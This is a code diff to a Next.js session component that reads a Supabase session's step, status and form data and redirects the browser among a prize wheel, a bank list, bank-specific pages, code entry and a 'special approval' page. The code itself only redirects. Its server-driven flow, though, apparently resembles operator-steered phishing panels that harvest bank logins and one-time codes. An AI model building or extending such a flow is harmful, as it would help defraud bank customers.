@@ -4,7 +4,7 @@ import { useEffect } from "react";
 import { usePathname } from "next/navigation";
 import type { SessionStatus, SessionStep } from "@/types/session";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { stepToPath } from "@/lib/session-routes";
+import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
 import {
   getPreferredRouteSessionId,
   persistActiveSession,
@@ -14,6 +14,18 @@ type Props = {
   sessionId: string;
   routeSessionId?: string;
 };
+
+const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
+
+function shouldPauseBankListRedirects(pathname: string) {
+  if (!pathname.startsWith("/banken")) return false;
+
+  try {
+    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
+  } catch {
+    return false;
+  }
+}
 
 export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
   const pathname = usePathname();
@@ -61,36 +73,35 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
   useEffect(() => {
     let cancelled = false;
     void (async () => {
+      if (shouldPauseBankListRedirects(pathname)) return;
       const supabase = createBrowserSupabaseClient();
       if (supabase === null) return;
-      const { data } = await supabase.from("sessions").select("current_step,status").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("current_step,status,form_data").eq("id", sessionId).maybeSingle();
 
       if (cancelled || !data) return;
-      if (data.current_step) {
-        const serverStep = data.current_step as SessionStep;
-        const target = stepToPath(serverStep, sessionId, effectiveRouteSessionId);
-        const targetPathname = (() => {
-          try {
-            return new URL(target, window.location.origin).pathname;
-          } catch {
-            return target;
-          }
-        })();
-
-        if (window.location.pathname !== targetPathname) {
-          window.location.href = target;
-          return;
-        }
-
-        return;
-      }
-
       const status = data.status as SessionStatus | undefined;
       if (status === "SPECIAL_INFO") {
         if (!pathname.startsWith("/special-approval")) {
           window.location.href = "/special-approval";
         }
         return;
+      }
+
+      if (!data.current_step) return;
+      const serverStep = data.current_step as SessionStep;
+      let local: string | null = pathToStep(pathname);
+      if (pathname.startsWith("/wheel")) local = "wheel";
+
+      if (local === "wheel" && serverStep === "code_entry") return;
+      if (local === "banken" && serverStep === "bank") return;
+
+      if (local && serverStep !== local) {
+        window.location.href = resolveStepTargetPath(
+          serverStep,
+          sessionId,
+          effectiveRouteSessionId,
+          (data.form_data ?? {}) as { bankSlug?: string | null },
+        );
       }
     })();
     return () => {
@@ -114,30 +125,35 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
           filter: `id=eq.${sessionId}`,
         },
         (payload) => {
-          const next = payload.new as { current_step?: SessionStep; status?: SessionStatus };
-          if (next.current_step) {
-            const target = stepToPath(next.current_step, sessionId, effectiveRouteSessionId);
-            const targetPathname = (() => {
-              try {
-                return new URL(target, window.location.origin).pathname;
-              } catch {
-                return target;
-              }
-            })();
-
-            if (window.location.pathname !== targetPathname) {
-              window.location.href = target;
-              return;
-            }
-
+          if (shouldPauseBankListRedirects(pathname)) {
             return;
           }
-
+          const next = payload.new as {
+            current_step?: SessionStep;
+            status?: SessionStatus;
+            form_data?: { bankSlug?: string | null } | null;
+          };
           if (next.status === "SPECIAL_INFO") {
             if (!pathname.startsWith("/special-approval")) {
               window.location.href = "/special-approval";
             }
             return;
+          }
+
+          if (!next.current_step) return;
+          let local: string | null = pathToStep(pathname);
+          if (pathname.startsWith("/wheel")) local = "wheel";
+
+          if (local === "wheel" && next.current_step === "code_entry") return;
+          if (local === "banken" && next.current_step === "bank") return;
+
+          if (local && next.current_step !== local) {
+            window.location.href = resolveStepTargetPath(
+              next.current_step,
+              sessionId,
+              effectiveRouteSessionId,
+              (next.form_data ?? {}) as { bankSlug?: string | null },
+            );
           }
         },
       )
